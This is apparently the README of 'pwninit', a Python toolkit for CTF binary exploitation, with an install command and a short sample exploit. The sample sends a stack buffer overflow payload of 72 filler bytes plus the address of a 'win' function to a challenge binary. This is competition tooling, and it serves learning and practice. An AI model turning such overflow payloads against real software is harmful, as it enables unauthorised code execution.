# pwninit

A Python toolkit for CTF binary exploitation. Streamline setup, development, and execution of exploits with automated binary analysis, library management, and template generation.

📖 **Full documentation**: [pwninit.0xb0tm4n.org](https://pwninit.0xb0tm4n.org)

## Installation

```sh
pipx install git+https://github.com/Super-Botman/pwninit.py.git
```

## Basic Exploit Example

```python
from pwninit import *

Config(
    binary="./chall",
    libc="./libc.so.6"
)

def exploit(ctx, io):
    exe = ctx.elf
    libc = ctx.libc

    payload = b"A" * 72 + p64(exe.symbols["win"])
    sl(payload)
    itrv()
```
